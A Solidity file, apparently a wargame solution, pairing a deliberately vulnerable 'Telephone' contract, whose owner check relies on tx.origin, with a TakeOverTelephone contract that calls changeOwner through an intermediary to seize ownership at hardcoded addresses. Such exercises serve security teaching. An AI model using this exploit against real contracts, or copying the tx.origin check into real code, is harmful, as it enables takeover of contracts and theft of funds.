pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


//Simply call changeOwner(address newOwner) from an entity A such that A->B->...->X->Y 
//where X is contract TakeOverTelephone and Y is contract Telephone
contract TakeOverTelephone {
    
    address public telephoneContractAddress = 0xDe3120Ce4122665ce80b4CAf40067ddda7F3BAcC;
    Telephone telephoneInst;
    
    function findTelephoneContract() public {
        telephoneInst = Telephone(telephoneContractAddress);
    }
    
    function takeOverTelephoneContract() public {
        telephoneInst.changeOwner(0x7B69Cf3D6A03C3cA6Ac5B9a620b6a07981c5E56F);
    }
}

